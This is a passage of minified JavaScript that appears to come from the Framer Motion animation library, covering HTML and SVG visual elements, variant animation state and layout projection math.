o1({element:this.current,name:n,keyframes:o,times:l,ease:u,duration:je(c)}),p=a(d);this.valueSubscriptions.set(n,()=>{p(),d.cancel()});return}const i=Zt.has(n);i&&this.onBindTransform&&this.onBindTransform();const r=t.on("change",a=>{this.latestValues[n]=a,this.props.onUpdate&&U.preRender(this.notifyUpdate),i&&this.projection&&(this.projection.isTransformDirty=!0),this.scheduleRender()});let s;typeof window<"u"&&window.MotionCheckAppearSync&&(s=window.MotionCheckAppearSync(this,n,t)),this.valueSubscriptions.set(n,()=>{r(),s&&s()})}sortNodePosition(n){return!this.current||!this.sortInstanceNodePosition||this.type!==n.type?0:this.sortInstanceNodePosition(this.current,n.current)}updateFeatures(){let n="animation";for(n in Ds){const t=Ds[n];if(!t)continue;const{isEnabled:i,Feature:r}=t;if(!this.features[n]&&r&&i(this.props)&&(this.features[n]=new r(this)),this.features[n]){const s=this.features[n];s.isMounted?s.update():(s.mount(),s.isMounted=!0)}}}triggerBuild(){this.build(this.renderState,this.latestValues,this.props)}measureViewportBox(){return this.current?this.measureInstanceViewportBox(this.current,this.props):Z()}getStaticValue(n){return this.latestValues[n]}setStaticValue(n,t){this.latestValues[n]=t}update(n,t){(n.transformTemplate||this.props.transformTemplate)&&this.scheduleRender(),this.prevProps=this.props,this.props=n,this.prevPresenceContext=this.presenceContext,this.presenceContext=t;for(let i=0;i<Ad.length;i++){const r=Ad[i];this.propEventSubscriptions[r]&&(this.propEventSubscriptions[r](),delete this.propEventSubscriptions[r]);const s="on"+r,a=n[s];a&&(this.propEventSubscriptions[r]=this.on(r,a))}this.prevMotionValues=jx(this,this.scrapeMotionValuesFromProps(n,this.prevProps||{},this),this.prevMotionValues),this.handleChildMotionValue&&this.handleChildMotionValue()}getProps(){return this.props}getVariant(n){return this.props.variants?this.props.variants[n]:void 0}getDefaultTransition(){return this.props.transition}getTransformPagePoint(){return this.props.transformPagePoint}getClosestVariantNode(){return this.isVariantNode?this:this.parent?this.parent.getClosestVariantNode():void 0}addVariantChild(n){const t=this.getClosestVariantNode();if(t)return t.variantChildren&&t.variantChildren.add(n),()=>t.variantChildren.delete(n)}addValue(n,t){const i=this.values.get(n);t!==i&&(i&&this.removeValue(n),this.bindToMotionValue(n,t),this.values.set(n,t),this.latestValues[n]=t.get())}removeValue(n){this.values.delete(n);const t=this.valueSubscriptions.get(n);t&&(t(),this.valueSubscriptions.delete(n)),delete this.latestValues[n],this.removeValueFromRenderState(n,this.renderState)}hasValue(n){return this.values.has(n)}getValue(n,t){if(this.props.values&&this.props.values[n])return this.props.values[n];let i=this.values.get(n);return i===void 0&&t!==void 0&&(i=Qt(t===null?void 0:t,{owner:this}),this.addValue(n,i)),i}readValue(n,t){let i=this.latestValues[n]!==void 0||!this.current?this.latestValues[n]:this.getBaseTargetFromProps(this.props,n)??this.readValueFromInstance(this.current,n,this.options);return i!=null&&(typeof i=="string"&&(lu(i)||uu(i))?i=parseFloat(i):typeof i!="number"&&!qe.test(i)&&qe.test(t)&&(i=bu(n,t)),this.setBaseTarget(n,ue(i)?i.get():i)),ue(i)?i.get():i}setBaseTarget(n,t){this.baseTarget[n]=t}getBaseTarget(n){var s;const{initial:t}=this.props;let i;if(typeof t=="string"||typeof t=="object"){const a=Pu(this.props,t,(s=this.presenceContext)==null?void 0:s.custom);a&&(i=a[n])}if(t&&i!==void 0)return i;const r=this.getBaseTargetFromProps(this.props,n);return r!==void 0&&!ue(r)?r:this.initialValues[n]!==void 0&&i===void 0?void 0:this.baseTarget[n]}on(n,t){return this.events[n]||(this.events[n]=new Cs),this.events[n].add(t)}notify(n,...t){this.events[n]&&this.events[n].notify(...t)}scheduleRenderMicrotask(){qu.render(this.render)}}class q1 extends Hx{constructor(){super(...arguments),this.KeyframeResolver=ux}sortInstanceNodePosition(n,t){return n.compareDocumentPosition(t)&2?1:-1}getBaseTargetFromProps(n,t){const i=n.style;return i?i[t]:void 0}removeValueFromRenderState(n,{vars:t,style:i}){delete t[n],delete i[n]}handleChildMotionValue(){this.childSubscription&&(this.childSubscription(),delete this.childSubscription);const{children:n}=this.props;ue(n)&&(this.childSubscription=n.on("change",t=>{this.current&&(this.current.textContent=`${t}`)}))}}class Gn{constructor(n){this.isMounted=!1,this.node=n}update(){}}function N1(e,{style:n,vars:t},i,r){const s=e.style;let a;for(a in n)s[a]=n[a];r==null||r.applyProjectionStyles(s,i);for(a in t)s.setProperty(a,t[a])}function Ed(e,n){return n.max===n.min?0:e/(n.max-n.min)*100}const li={correct:(e,n)=>{if(!n.target)return e;if(typeof e=="string")if(N.test(e))e=parseFloat(e);else return e;const t=Ed(e,n.target.x),i=Ed(e,n.target.y);return`${t}% ${i}%`}},zx={correct:(e,{treeScale:n,projectionDelta:t})=>{const i=e,r=qe.parse(e);if(r.length>5)return i;const s=qe.createTransformer(e),a=typeof r[0]!="number"?1:0,o=t.x.scale*n.x,l=t.y.scale*n.y;r[0+a]/=o,r[1+a]/=l;const u=j(o,l,.5);return typeof r[2+a]=="number"&&(r[2+a]/=u),typeof r[3+a]=="number"&&(r[3+a]/=u),s(r)}},ol={borderRadius:{...li,applyTo:[...Lu]},borderTopLeftRadius:li,borderTopRightRadius:li,borderBottomLeftRadius:li,borderBottomRightRadius:li,boxShadow:zx};function I1(e,{layout:n,layoutId:t}){return Zt.has(e)||e.startsWith("origin")||(n||t!==void 0)&&(!!ol[e]||e==="opacity")}function Mu(e,n,t){var a;const i=e.style,r=n==null?void 0:n.style,s={};if(!i)return s;for(const o in i)(ue(i[o])||r&&ue(r[o])||I1(o,e)||((a=t==null?void 0:t.getValue(o))==null?void 0:a.liveStyle)!==void 0)&&(s[o]=i[o]);return s}function Gx(e){return window.getComputedStyle(e)}class Xx extends q1{constructor(){super(...arguments),this.type="html",this.renderInstance=N1}mount(n){$s(!!n.style),super.mount(n)}readValueFromInstance(n,t){var i;if(Zt.has(t))return(i=this.projection)!=null&&i.isProjecting?Qo(t):m0(n,t);{const r=Gx(n),s=(Vh(t)?r.getPropertyValue(t):r[t])||0;return typeof s=="string"?s.trim():s}}measureInstanceViewportBox(n,{transformPagePoint:t}){return C1(n,t)}build(n,t,i){Du(n,t,i.transformTemplate)}scrapeMotionValuesFromProps(n,t,i){return Mu(n,t,i)}}const M1=new Set(["baseFrequency","diffuseConstant","kernelMatrix","kernelUnitLength","keySplines","keyTimes","limitingConeAngle","markerHeight","markerWidth","numOctaves","targetX","targetY","surfaceScale","specularConstant","specularExponent","stdDeviation","tableValues","viewBox","gradientTransform","pathLength","startOffset","textLength","lengthAdjust"]),O1=e=>typeof e=="string"&&e.toLowerCase()==="svg";function Qx(e,n,t,i){N1(e,n,void 0,i);for(const r in n.attrs)e.setAttribute(M1.has(r)?r:Tu(r),n.attrs[r])}function w1(e,n,t){const i=Mu(e,n,t);for(const r in e)if(ue(e[r])||ue(n[r])){const s=Yt.indexOf(r)!==-1?"attr"+r.charAt(0).toUpperCase()+r.substring(1):r;i[s]=e[r]}return i}class Wx extends q1{constructor(){super(...arguments),this.type="svg",this.isSVGTag=!1,this.measureInstanceViewportBox=Z}getBaseTargetFromProps(n,t){return n[t]}readValueFromInstance(n,t){if(Zt.has(t)){const i=Zh(t);return i&&i.default||0}if(v1.includes(t)){const r=getComputedStyle(n)[t];if(typeof r=="string"&&r)return r.trim()}return t=M1.has(t)?t:Tu(t),n.getAttribute(t)}scrapeMotionValuesFromProps(n,t,i){return w1(n,t,i)}build(n,t,i){y1(n,t,this.isSVGTag,i.transformTemplate,i.style)}renderInstance(n,t,i,r){Qx(n,t,i,r)}mount(n){this.isSVGTag=O1(n.tagName),super.mount(n)}}const $x=Rs.length;function B1(e){if(!e)return;if(!e.isControllingVariants){const t=e.parent?B1(e.parent)||{}:{};return e.props.initial!==void 0&&(t.initial=e.props.initial),t}const n={};for(let t=0;t<$x;t++){const i=Rs[t],r=e.props[i];(Wi(r)||r===!1)&&(n[i]=r)}return n}function F1(e,n){if(!Array.isArray(n))return!1;const t=n.length;if(t!==e.length)return!1;for(let i=0;i<t;i++)if(n[i]!==e[i])return!1;return!0}const Kx=[...Iu].reverse(),Jx=Iu.length;function Yx(e){return n=>Promise.all(n.map(({animation:t,options:i})=>tx(e,t,i)))}function Zx(e){let n=Yx(e),t=Pd(),i=!0,r=!1;const s=u=>(c,d)=>{var g;const p=ot(e,d,u==="exit"?(g=e.presenceContext)==null?void 0:g.custom:void 0);if(p){const{transition:v,transitionEnd:x,...b}=p;c={...c,...b,...x}}return c};function a(u){n=u(e)}function o(u){const{props:c}=e,d=B1(e.parent)||{},p=[],g=new Set;let v={},x=1/0;for(let h=0;h<Jx;h++){const m=Kx[h],f=t[m],y=c[m]!==void 0?c[m]:d[m],A=Wi(y),T=m===u?f.isActive:null;T===!1&&(x=h);let S=y===d[m]&&y!==c[m]&&A;if(S&&(i||r)&&e.manuallyAnimateOnMount&&(S=!1),f.protectedKeys={...v},!f.isActive&&T===null||!y&&!f.prevProp||Js(y)||typeof y=="boolean")continue;if(m==="exit"&&f.isActive&&T!==!0){f.prevResolvedValues&&(v={...v,...f.prevResolvedValues});continue}const C=eS(f.prevProp,y);let I=C||m===u&&f.isActive&&!S&&A||h>x&&A,q=!1;const z=Array.isArray(y)?y:[y];let Te=z.reduce(s(m),{});T===!1&&(Te={});const{prevResolvedValues:Cn={}}=f,sr={...Cn,...Te},ar=L=>{I=!0,g.has(L)&&(q=!0,g.delete(L)),f.needsAnimating[L]=!0;const M=e.getValue(L);M&&(M.liveStyle=!1)};for(const L in sr){const M=Te[L],O=Cn[L];if(v.hasOwnProperty(L))continue;let k=!1;el(M)&&el(O)?k=!F1(M,O)||C:k=M!==O,k?M!=null?ar(L):g.add(L):M!==void 0&&g.has(L)?ar(L):f.protectedKeys[L]=!0}f.prevProp=y,f.prevResolvedValues=Te,f.isActive&&(v={...v,...Te}),(i||r)&&e.blockInitialAnimation&&(I=!1);const ht=S&&C;I&&(!ht||q)&&p.push(...z.map(L=>{const M={type:m};if(typeof L=="string"&&(i||r)&&!ht&&e.manuallyAnimateOnMount&&e.parent){const{parent:O}=e,k=ot(O,L);if(O.enteringChildren&&k){const{delayChildren:J}=k.transition||{};M.delay=u1(O.enteringChildren,e,J)}}return{animation:L,options:M}}))}if(g.size){const h={};if(typeof c.initial!="boolean"){const m=ot(e,Array.isArray(c.initial)?c.initial[0]:c.initial);m&&m.transition&&(h.transition=m.transition)}g.forEach(m=>{const f=e.getBaseTarget(m),y=e.getValue(m);y&&(y.liveStyle=!0),h[m]=f??null}),p.push({animation:h})}let b=!!p.length;return i&&(c.initial===!1||c.initial===c.animate)&&!e.manuallyAnimateOnMount&&(b=!1),i=!1,r=!1,b?n(p):Promise.resolve()}function l(u,c){var p;if(t[u].isActive===c)return Promise.resolve();(p=e.variantChildren)==null||p.forEach(g=>{var v;return(v=g.animationState)==null?void 0:v.setActive(u,c)}),t[u].isActive=c;const d=o(u);for(const g in t)t[g].protectedKeys={};return d}return{animateChanges:o,setActive:l,setAnimateFunction:a,getState:()=>t,reset:()=>{t=Pd(),r=!0}}}function eS(e,n){return typeof n=="string"?n!==e:Array.isArray(n)?!F1(n,e):!1}function Wn(e=!1){return{isActive:e,protectedKeys:{},needsAnimating:{},prevResolvedValues:{}}}function Pd(){return{animate:Wn(!0),whileInView:Wn(),whileHover:Wn(),whileTap:Wn(),whileDrag:Wn(),whileFocus:Wn(),exit:Wn()}}function ll(e,n){e.min=n.min,e.max=n.max}function He(e,n){ll(e.x,n.x),ll(e.y,n.y)}function Td(e,n){e.translate=n.translate,e.scale=n.scale,e.originPoint=n.originPoint,e.origin=n.origin}const k1=1e-4,nS=1-k1,tS=1+k1,j1=.01,iS=0-j1,rS=0+j1;function ve(e){return e.max-e.min}function sS(e,n,t){return Math.abs(e-n)<=t}function Ld(e,n,t,i=.5){e.origin=i,e.originPoint=j(n.min,n.max,e.origin),e.scale=ve(t)/ve(n),e.translate=j(t.min,t.max,e.origin)-e.originPoint,(e.scale>=nS&&e.scale<=tS||isNaN(e.scale))&&(e.scale=1),(e.translate>=iS&&e.translate<=rS||isNaN(e.translate))&&(e.translate=0)}function Pi(e,n,t,i){Ld(e.x,n.x,t.x,i?i.originX:void 0),Ld(e.y,n.y,t.y,i?i.originY:void 0)}function Rd(e,n,t,i=0){const r=i?j(t.min,t.max,i):t.min;e.min=r+n.min,e.max=e.min+ve(n)}function aS(e,n,t,i){Rd(e.x,n.x,t.x,i==null?void 0:i.x),Rd(e.y,n.y,t.y,i==null?void 0:i.y)}function Dd(e,n,t,i=0){const r=i?j(t.min,t.max,i):t.min;e.min=n.min-r,e.max=e.min+ve(n)}function qs(e,n,t,i){Dd(e.x,n.x,t.x,i==null?void 0:i.x),Dd(e.y,n.y,t.y,i==null?void 0:i.y)}function qd(e,n,t,i,r){return e-=n,e=Ls(e,1/t,i),r!==void 0&&(e=Ls(e,1/r,i)),e}function oS(e,n=0,t=1,i=.5,r,s=e,a=e){if(ln.test(n)&&(n=parseFloat(n),n=j(a.min,a.max,n/100)-a.min),typeof n!="number")return;let o=j(s.min,s.max,i);e===s&&(o-=n),e.min=qd(e.min,n,t,o,r),e.max=qd(e.max,n,t,o,r)}function Nd(e,n,[t,i,r],s,a){oS(e,n[t],n[i],n[r],n.scale,s,a)}const lS=["x","scaleX","originX"],uS=["y","scaleY","originY"];function Id(e,n,t,i){Nd(e.x,n,lS,t?t.x:void 0,i?i.x:void 0),Nd(e.y,n,uS,t?t.y:void 0,i?i.y:void 0)}function Md(e){return e.translate===0&&e.scale===1}function U1(e){return Md(e.x)&&Md(e.y)}function Od(e,n){return e.min===n.min&&e.max===n.max}function cS(e,n){return Od(e.x,n.x)&&Od(e.y,n.y)}function wd(e,n){return Math.round(e.min)===Math.round(n.min)&&Math.round(e.max)===Math.round(n.max)}function V1(e,n){return wd(e.x,n.x)&&wd(e.y,n.y)}function Bd(e){return ve(e.x)/ve(e.y)}function Fd(e,n){return e.translate===n.translate&&e.scale===n.scale&&e.originPoint===n.originPoint}function tn(e){return[e("x"),e("y")]}function dS(e,n,t){let i="";const r=e.x.translate/n.x,s=e.y.translate/n.y,a=(t==null?void 0:t.z)||0;if((r||s||a)&&(i=`translate3d(${r}px, ${s}px, ${a}px) `),(n.x!==1||n.y!==1)&&(i+=`scale(${1/n.x}, ${1/n.y}) `),t){const{transformPerspective:u,rotate:c,pathRotation:d,rotateX:p,rotateY:g,skewX:v,skewY:x}=t;u&&(i=`perspective(${u}px) ${i}`),c&&(i+=`rotate(${c}deg) `),d&&(i+=`rotate(${d}deg) `),p&&(i+=`rotateX(${p}deg) `),g&&(i+=`rotateY(${g}deg) `),v&&(i+=`skewX(${v}deg) `),x&&(i+=`skewY(${x}deg) `)}const o=e.x.scale*n.x,l=e.y.scale*n.y;return(o!==1||l!==1)&&(i+=`scale(${o}, ${l})`),i||"none"}const pS=Lu.length,kd=e=>typeof e=="string"?parseFloat(e):e,jd=e=>typeof e=="number"||N.test(e);function mS(e,n,t,i,r,s){r?(e.opacity=j(0,t.opacity??1,fS(i)),e.opacityExit=j(n.opacity??1,0,hS(i))):s&&(e.opacity=j(n.opacity??1,t.opacity??1,i));for(let a=0;a<pS;a++){const o=Lu[a];let l=Ud(n,o),u=Ud(t,o);if(l===void 0&&u===void 0)continue;l||(l=0),u||(u=0),l===0||u===0||jd(l)===jd(u)?(e[o]=Math.max(j(kd(l),kd(u),i),0),(ln.test(u)||ln.test(l))&&(e[o]+="%")):e[o]=u}(n.rotate||t.rotate)&&(e.rotate=j(n.rotate||0,t.rotate||0,i))}function Ud(e,n){return e[n]!==void 0?e[n]:e.borderRadius}const fS=_1(0,.5,Bh),hS=_1(.5,.95,Je);function _1(e,n,t){return i=>i<e?0:i>n?1:t(Gi(e,n,i))}function gS(e,n,t){const i=ue(e)?e:Qt(e);return i.start(Eu("",i,n,t)),i.animation}function $i(e,n,t,i={passive:!0}){return e.addEventListener(n,t,i),()=>e.removeEventListener(n,t,i)}const vS=(e,n)=>e.depth-n.depth;class yS{constructor(){this.children=[],this.isDirty=!1}add(n){ou(this.children,n),this.isDirty=!0}remove(n){bs(this.children,n),this.isDirty=!0}forEach(n){this.isDirty&&this.children.sort(vS),this.isDirty=!1,this.children.forEach(n)}}function xS(e,n){const t=le.now(),i=({timestamp:r})=>{const s=r-t;s>=n&&(Vn(i),e(s-n))};return U.setup(i,!0),()=>Vn(i)}function $r(e){return ue(e)?e.get():e}class SS{constructor(){this.members=[]}add(n){ou(this.members,n);for(let t=this.members.length-1;t>=0;t--){const i=this.members[t];if(i===n||i===this.lead||i===this.prevLead)continue;const r=i.instance;(!r||r.isConnected===!1)&&!i.snapshot&&(bs(this.members,i),i.unmount())}n.scheduleRender()}remove(n){if(bs(this.members,n),n===this.prevLead&&(this.prevLead=void 0),n===this.lead){const t=this.members[this.members.length-1];t&&this.promote(t)}}relegate(n){var t;for(let i=this.members.indexOf(n)-1;i>=0;i--){const r=this.members[i];if(r.isPresent!==!1&&((t=r.instance)==null?void 0:t.isConnected)!==!1)return this.promote(r),!0}return!1}promote(n,t){var r;const i=this.lead;if(n!==i&&(this.prevLead=i,this.lead=n,n.show(),i)){i.updateSnapshot(),n.scheduleRender();const{layoutDependency:s}=i.options,{layoutDependency:a}=n.options;(s===void 0||s!==a)&&(n.resumeFrom=i,t&&(i.preserveOpacity=!0),i.snapshot&&(n.snapshot=i.snapshot,n.snapshot.latestValues=i.animationValues||i.latestValues),(r=n.root)!=null&&r.isUpdating&&(n.isLayoutDirty=!0)),n.options.crossfade===!1&&i.hide()}}exitAnimationComplete(){this.members.forEach(n=>{var t,i,r,s,a;(i=(t=n.options).onExitComplete)==null||i.call(t),(a=(r=n.resumingFrom)==null?void 0:(s=r.options).onExitComplete)==null||a.call(s)})}scheduleRender(){this.members.forEach(n=>n.instance&&n.scheduleRender(!1))}removeLeadSnapshot(){var n;(n=this.lead)!=null&&n.snapshot&&(this.lead.snapshot=void 0)}}const Kr={hasAnimatedSinceResize:!0,hasEverUpdated:!1},Fa=["","X","Y","Z"],bS=1e3;let CS=0;function ka(e,n,t,i){const{latestValues:r}=n;r[e]&&(t[e]=r[e],n.setStaticValue(e,0),i&&(i[e]=0))}function H1(e){if(e.hasCheckedOptimisedAppear=!0,e.root===e)return;const{visualElement:n}=e.options;if(!n)return;const t=f1(n);if(window.MotionHasOptimisedAnimation(t,"transform")){const{layout:r,layoutId:s}=e.options;window.MotionCancelOptimisedAnimation(t,"transform",U,!(r||s))}const{parent:i}=e;i&&!i.hasCheckedOptimisedAppear&&H1(i)}function z1({attachResizeListener:e,defaultParent:n,measureScroll:t,checkIsScrollRoot:i,resetTransform:r}){return class{constructor(a={},o=n==null?void 0:n()){this.id=CS++,this.animationId=0,this.animationCommitId=0,this.children=new Set,this.options={},this.isTreeAnimating=!1,this.isAnimationBlocked=!1,this.isLayoutDirty=!1,this.isProjectionDirty=!1,this.isSharedProjectionDirty=!1,this.isTransformDirty=!1,this.updateManuallyBlocked=!1,this.updateBlockedByResize=!1,this.isUpdating=!1,this.isSVG=!1,this.needsReset=!1,this.shouldResetTransform=!1,this.hasCheckedOptimisedAppear=!1,this.treeScale={x:1,y:1},this.eventHandlers=new Map,this.hasTreeAnimated=!1,this.updateScheduled=!1,this.scheduleUpdate=()=>this.update(),this.projectionUpdateScheduled=!1,this.checkUpdateFailed=()=>{this.isUpdating&&(this.isUpdating=!1,this.clearAllSnapshots())},this.updateProjection=()=>{this.projectionUpdateScheduled=!1,this.nodes.forEach(PS),this.nodes.forEach(IS),this.nodes.forEach(MS),this.nodes.forEach(TS)},this.resolvedRelativeTargetAt=0,this.hasProjected=!1,this.isVisible=!0,this.animationProgress=0,this.sharedNodes=new Map,this.latestValues=a,this.root=o?o.root||o:this,this.path=o?[...o.path,o]:[],this.parent=o,this.depth=o?o.depth+1:0;for(let l=0;l<this.path.length;l++)this.path[l].shouldResetTransform=!0;this.root===this&&(this.nodes=new yS)}addEventListener(a,o){return this.eventHandlers.has(a)||this.eventHandlers.set(a,new Cs),this.eventHandlers.get(a).add(o)}notifyListeners(a,...o){const l=this.eventHandlers.get(a);l&&l.notify(...o)}hasListeners(a){return this.eventHandlers.has(a)}mount(a){if(this.instance)return;this.isSVG=Ru(a)&&!Fx(a),this.instance=a;const{layoutId:o,layout:l,visualElement:u}=this.options;if(u&&!u.current&&u.mount(a),this.root.nodes.add(this),this.parent&&this.parent.children.add(this),this.root.hasTreeAnimated&&(l||o)&&(this.isLayoutDirty=!0),e){let c,d=0;const p=()=>this.root.updateBlockedByResize=!1;U.read(()=>{d=window.innerWidth}),e(a,()=>{const g=window.innerWidth;g!==d&&(d=g,this.root.updateBlockedByResize=!0,c&&c(),c=xS(p,250),Kr.hasAnimatedSinceResize&&(Kr.hasAnimatedSinceResize=!1,this.nodes.forEach(Hd)))})}o&&this.root.registerSharedNode(o,this),this.options.animate!==!1&&u&&(o||l)&&this.addEventListener("didUpdate",({delta:c,hasLayoutChanged:d,hasRelativeLayoutChanged:p,layout:g})=>{if(this.isTreeAnimationBlocked()){this.target=void 0,this.relativeTarget=void 0;return}const v=this.options.transition||u.getDefaultTransition()||kS,{onLayoutAnimationStart:x,onLayoutAnimationComplete:b}=u.getProps(),h=!this.targetLayout||!V1(this.targetLayout,g),m=!d&&p;if(this.options.layoutRoot||this.resumeFrom||m||d&&(h||!this.currentAnimation)){this.resumeFrom&&(this.resumingFrom=this.resumeFrom,this.resumingFrom.resumingFrom=void 0);const f={...Au(v,"layout"),onPlay:x,onComplete:b};(u.shouldReduceMotion||this.options.layoutRoot)&&(f.delay=0,f.type=!1),this.startAnimation(f),this.setAnimationOrigin(c,m,f.path)}else d||Hd(this),this.isLead()&&this.options.onExitComplete&&this.options.onExitComplete();this.targetLayout=g})}unmount(){this.options.layoutId&&this.willUpdate(),this.root.nodes.remove(this);const a=this.getStack();a&&a.remove(this),this.parent&&this.parent.children.delete(this),this.instance=void 0,this.eventHandlers.clear(),Vn(this.updateProjection)}blockUpdate(){this.updateManuallyBlocked=!0}unblockUpdate(){this.updateManuallyBlocked=!1}isUpdateBlocked(){return this.updateManuallyBlocked||this.updateBlockedByResize}isTreeAnimationBlocked(){return this.isAnimationBlocked||this.parent&&this.parent.isTreeAnimationBlocked()||!1}startUpdate(){this.isUpdateBlocked()||(this.isUpdating=!0,this.nodes&&this.nodes.forEach(OS),this.animationId++)}getTransformTemplate(){const{visualElement:a}=this.options;return a&&a.getProps().transformTemplate}willUpdate(a=!0){if(this.root.hasTreeAnimated=!0,this.root.isUpdateBlocked()){this.options.onExitComplete&&this.options.onExitComplete();return}if(window.MotionCancelOptimisedAnimation&&!this.hasCheckedOptimisedAppear&&H1(this),!this.root.isUpdating&&this.root.startUpdate(),this.isLayoutDirty)return;this.isLayoutDirty=!0;for(let c=0;c<this.path.length;c++){const d=this.path[c];d.shouldResetTransform=!0,(typeof d.latestValues.x=="string"||typeof d.latestValues.y=="string")&&(d.isLayoutDirty=!0),d.updateScroll("snapshot"),d.options.layoutRoot&&d.willUpdate(!1)}const{layoutId:o,layout:l}=this.options;if(o===void 0&&!l)return;const u=this.getTransformTemplate();this.prevTransformTemplateValue=u?u(this.latestValues,""):void 0,this.updateSnapshot(),a&&this.notifyListeners("willUpdate")}update(){if(this.updateScheduled=!1,this.isUpdateBlocked()){const l=this.updateBlockedByResize;this.unblockUpdate(),this.updateBlockedByResize=!1,this.clearAllSnapshots(),l&&this.nodes.forEach(RS),this.nodes.forEach(Vd);return}if(this.animationId<=this.animationCommitId){this.nodes.forEach(_d);return}this.animationCommitId=this.animationId,this.isUpdating?(this.isUpdating=!1,this.nodes.forEach(DS),this.nodes.forEach(qS),this.nodes.forEach(NS),this.nodes.forEach(AS),this.nodes.forEach(ES)):this.nodes.forEach(_d),this.clearAllSnapshots();const o=le.now();ie.delta=Ze(0,1e3/60,o-ie.timestamp),ie.timestamp=o,ie.isProcessing=!0,Ra.update.process(ie),Ra.preRender.process(ie),Ra.render.process(ie),ie.isProcessing=!1}didUpdate(){this.updateScheduled||(this.updateScheduled=!0,qu.read(this.scheduleUpdate))}clearAllSnapshots(){this.nodes.forEach(LS),this.sharedNodes.forEach(wS)}scheduleUpdateProjection(){this.projectionUpdateScheduled||(this.projectionUpdateScheduled=!0,U.preRender(this.updateProjection,!1,!0))}scheduleCheckAfterUnmount(){U.postRender(()=>{this.isLayoutDirty?this.root.didUpdate():this.root.checkUpdateFailed()})}updateSnapshot(){this.snapshot||!this.instance||(this.snapshot=this.measure(),this.snapshot&&!ve(this.snapshot.measuredBox.x)&&!ve(this.snapshot.measuredBox.y)&&(this.snapshot=void 0))}updateLayout(){if(!this.instance||(this.updateScroll(),!(this.options.alwaysMeasureLayout&&this.isLead())&&!this.isLayoutDirty))return;if(this.resumeFrom&&!this.resumeFrom.instance)for(let l=0;l<this.path.length;l++)this.path[l].updateScroll();const a=this.layout;this.layout=this.measure(!1),this.layoutCorrected||(this.layoutCorrected=Z()),this.isLayoutDirty=!1,this.projectionDelta=void 0,this.notifyListeners("measure",this.layout.layoutBox);const{visualElement:o}=this.options;o&&o.notify("LayoutMeasure",this.layout.layoutBox,a?a.layoutBox:void 0)}updateScroll(a="measure"){let o=!!(this.options.layoutScroll&&this.instance);if(this.scroll&&this.scroll.animationId===this.root.animationId&&this.scroll.phase===a&&(o=!1),o&&this.instance){const l=i(this.instance);this.scroll={animationId:this.root.animationId,phase:a,isRoot:l,offset:t(this.instance),wasRoot:this.scroll?this.scroll.isRoot:l}}}resetTransform(){if(!r)return;const a=this.isLayoutDirty||this.shouldResetTransform||this.options.alwaysMeasureLayout,o=this.projectionDelta&&!U1(this.projectionDelta),l=this.getTransformTemplate(),u=l?l(this.latestValues,""):void 0,c=u!==this.prevTransformTemplateValue;a&&this.instance&&(o||Jn(this.latestValues)||c)&&(r(this.instance,u),this.shouldResetTransform=!1,this.scheduleRender())}measure(a=!0){const o=this.measurePageBox();let l=this.removeElementScroll(o);return a&&(l=this.removeTransform(l)),jS(l),{animationId:this.root.animationId,measuredBox:o,layoutBox:l,latestValues:{},source:this.id}}measurePageBox(){var u;const{visualElement:a}=this.options;if(!a)return Z();const o=a.measureViewportBox();if(!(((u=this.scroll)==null?void 0:u.wasRoot)||this.path.some(US))){const{scroll:c}=this.root;c&&(rn(o.x,c.offset.x),rn(o.y,c.offset.y))}return o}removeElementScroll(a){var l;const o=Z();if(He(o,a),(l=this.scroll)!=null&&l.wasRoot)return o;for(let u=0;u<this.path.length;u++){const c=this.path[u],{scroll:d,options:p}=c;c!==this.root&&d&&p.layoutScroll&&(d.wasRoot&&He(o,a),rn(o.x,d.offset.x),rn(o.y,d.offset.y))}return o}applyTransform(a,o=!1,l){var c,d;const u=l||Z();He(u,a);for(let p=0;p<this.path.length;p++){const g=this.path[p];!o&&g.options.layoutScroll&&g.scroll&&g!==g.root&&(rn(u.x,-g.scroll.offset.x),rn(u.y,-g.scroll.offset.y)),Jn(g.latestValues)&&Gr(u,g.latestValues,(c=g.layout)==null?void 0:c.layoutBox)}return Jn(this.latestValues)&&Gr(u,this.latestValues,(d=this.layout)==null?void 0:d.layoutBox),u}removeTransform(a){var l;const o=Z();He(o,a);for(let u=0;u<this.path.length;u++){const c=this.path[u];if(!Jn(c.latestValues))continue;let d;c.instance&&(rl(c.latestValues)&&c.updateSnapshot(),d=Z(),He(d,c.measurePageBox())),Id(o,c.latestValues,(l=c.snapshot)==null?void 0:l.layoutBox,d)}return Jn(this.latestValues)&&Id(o,this.latestValues),o}setTargetDelta(a){this.targetDelta=a,this.root.scheduleUpdateProjection(),this.isProjectionDirty=!0}setOptions(a){this.options={...this.options,...a,crossfade:a.crossfade!==void 0?a.crossfade:!0}}clearMeasurements(){this.scroll=void 0,this.layout=void 0,this.snapshot=void 0,this.prevTransformTemplateValue=void 0,this.targetDelta=void 0,this.target=void 0,this.isLayoutDirty=!1}forceRelativeParentToResolveTarget(){this.relativeParent&&this.relativeParent.resolvedRelativeTargetAt!==ie.timestamp&&this.relativeParent.resolveTargetDelta(!0)}resolveTargetDelta(a=!1){var g;const o=this.getLead();this.isProjectionDirty||(this.isProjectionDirty=o.isProjectionDirty),this.isTransformDirty||(this.isTransformDirty=o.isTransformDirty),this.isSharedProjectionDirty||(this.isSharedProjectionDirty=o.isSharedProjectionDirty);const l=!!this.resumingFrom||this!==o;if(!(a||l&&this.isSharedProjectionDirty||this.isProjectionDirty||(g=this.parent)!=null&&g.isProjectionDirty||this.attemptToResolveRelativeTarget||this.root.updateBlockedByResize))return;const{layout:c,layoutId:d}=this.options;if(!this.layout||!(c||d))return;this.resolvedRelativeTargetAt=ie.timestamp;const p=this.getClosestProjectingParent();!this.targetDelta&&!this.relativeTarget&&(this.options.layoutAnchor!==!1&&p&&p.layout?this.createRelativeTarget(p,this.layout.layoutBox,p.layout.layoutBox):this.removeRelativeTarget()),!(!this.relativeTarget&&!this.targetDelta)&&(this.target||(this.target=Z(),this.targetWithTransforms=Z()),this.relativeTarget&&this.relativeTargetOrigin&&this.relativeParent&&this.relativeParent.target?(this.forceRelativeParentToResolveTarget(),aS(this.target,this.relativeTarget,this.relativeParent.target,this.options.layoutAnchor||void 0)):this.targetDelta?(this.resumingFrom?this.applyTransform(this.layout.layoutBox,!1,this.target):He(this.target,this.layout.layoutBox),b1(this.target,this.targetDelta)):He(this.target,this.layout.layoutBox),this.attemptToResolveRelativeTarget&&(this.attemptToResolveRelativeTarget=!1,this.options.layoutAnchor!==!1&&p&&!!p.resumingFrom==!!this.resumingFrom&&!p.options.layoutScroll&&p.target&&this.animationProgress!==1?this.createRelativeTarget(p,this.target,p.target):this.relativeParent=this.relativeTarget=void 